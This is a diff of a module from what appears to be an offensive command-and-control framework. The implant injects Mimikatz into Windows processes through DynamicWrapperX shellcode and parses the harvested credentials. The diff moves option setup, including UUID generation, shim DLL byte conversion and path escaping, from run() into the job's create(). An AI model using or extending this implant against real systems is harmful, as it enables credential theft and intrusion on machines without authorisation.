@@ -4,11 +4,20 @@ import core.cred_parser
 import string
 import collections
 import time
+import uuid
 
 class DynWrapXShellcodeJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
         self.errstat = 0
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
+        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
+        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def parse_mimikatz(self, data):
         cp = core.cred_parser.CredParse(self)
@@ -133,22 +142,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
         return ret[:-1] # strip last comma
 
     def run(self):
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
-        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
-
-
-        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-
-
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dynwrapx.js", self.options)
+        workloads["js"] = "data/implant/inject/mimikatz_dynwrapx.js"
 
         self.dispatch(workloads, self.job)
